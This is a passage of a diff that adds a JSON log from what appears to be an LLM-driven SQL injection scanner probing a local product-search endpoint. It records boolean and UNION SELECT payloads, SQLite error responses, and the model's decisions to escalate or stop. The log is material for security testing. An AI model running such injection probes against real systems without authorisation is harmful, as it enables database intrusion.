+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 0,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached.",
+          "confirmation_rejections": [
+            {
+              "payload": "UNION SELECT NULL, NULL",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "String/search probe rejected because it lacks a string delimiter.",
+                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            }
+          ]
+        }
+      ],
+      "parameter": "q",
+      "parameter_location": "query",
+      "path_index": null,
+      "original_value": null,
+      "payload": " OR 'a'='d",
+      "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+      "expected_signal": "SQL parser/database error",
+      "observed_signal": "sql_error",
+      "evidence": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> ",
+      "baseline_status": 200,
+      "probe_status": 500
+    },
+    {
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/rest/products/search",
+      "path": "/rest/products/search",
+      "endpoint_context": {
+        "endpoint_type": "search",
+        "resource": "product search results",
+        "likely_sql_context": "string_search",
+        "recommended_attack_style": "string_search_error_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "search endpoint with query parameter"
+      },
+      "target_params": [
+        {
+          "name": "q",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "search",
+            "resource": "product search results",
+            "likely_sql_context": "string_search",
+            "recommended_attack_style": "string_search_error_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter",
+            "starting_strategy": "string_search_error_probe"
+          },
+          "payload_count": 7,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='a",
+              "payload_rationale": "string_search_error_probe",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2086,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2101,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "read_confirmation",
+              "payload": "UNION SELECT NULL, 'marker'",
+              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "marker",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2098,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2088,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 984,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='b",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2085,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='c",
+              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+              "expected_signal": "SQL parser error with a syntax error message",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2064,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2103,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 39,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='d",
+              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2066,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2071,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 5,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='e",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2056,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2083,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 27,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='g",
+              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2087,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 0,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached.",
+          "confirmation_rejections": [
+            {
+              "payload": "UNION SELECT NULL, NULL",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "String/search probe rejected because it lacks a string delimiter.",
+                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
